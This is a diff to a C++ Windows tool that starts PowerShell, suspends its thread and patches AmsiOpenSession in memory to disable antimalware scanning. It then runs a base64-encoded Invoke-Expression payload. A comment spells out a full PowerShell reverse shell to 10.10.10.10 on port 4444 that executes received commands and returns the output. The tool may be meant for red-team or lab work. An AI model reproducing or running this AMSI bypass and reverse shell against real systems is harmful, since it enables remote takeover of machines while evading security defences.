@@ -63,7 +63,7 @@ bool patch_amsi(HANDLE hProcess) {
     if (ams_dll != NULL) {
         FARPROC addr = GetProcAddress(ams_dll, "AmsiOpenSession");
         char* addr_ptr = reinterpret_cast<char*>(addr);
-        const char new_value[] = { 0x45, 0x45, 0x45, 0x45 };
+        const char new_value[] = { 0x00, 0x00, 0x00, 0x00};
         SIZE_T size = sizeof(new_value);
         SIZE_T bytes_written;
         DWORD offset = 0xC;
@@ -77,15 +77,6 @@ bool patch_amsi(HANDLE hProcess) {
     return success;
 }
 
-std::string hex_to_string(char hex[], int length) {
-    std::stringstream ss;
-    for (int i = 0; i < length; i++) {
-        char ascii = static_cast<char>(hex[i]);
-        ss << ascii;
-    }
-
-    return ss.str();
-}
 
 int main()
 {
@@ -101,7 +92,7 @@ int main()
     if (path_power == "") {
         return EXIT_FAILURE;
     }
-    
+
     std::string power = path_power + "\\powershell.exe";
     LPWSTR wpower_path = string_to_LPWSTR(power);
     STARTUPINFO si;
@@ -147,9 +138,22 @@ int main()
         return EXIT_FAILURE;
     }
 
-    Sleep(1000);
+    Sleep(6000); 
+    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, pi.dwThreadId);
+    if (hThread == NULL) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        CloseHandle(hStdinRd);
+        CloseHandle(hStdoutRd);
+        CloseHandle(hStdinWr);
+        return EXIT_FAILURE;
+    }
+
+    SuspendThread(hThread);
+    Sleep(6000);
     if (patch_amsi(pi.hProcess)) {
-        //base64 = $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | ForEach-Object {0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);$sendback = (Invoke-Expression $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close();
+        ResumeThread(hThread);
+         //base64 = $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | ForEach-Object {0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);$sendback = (Invoke-Expression $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close();
         std::string command = "Invoke-Expression -Command ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>')))";
         WORD length = static_cast<WORD>(command.length());
         DWORD bytes_written;
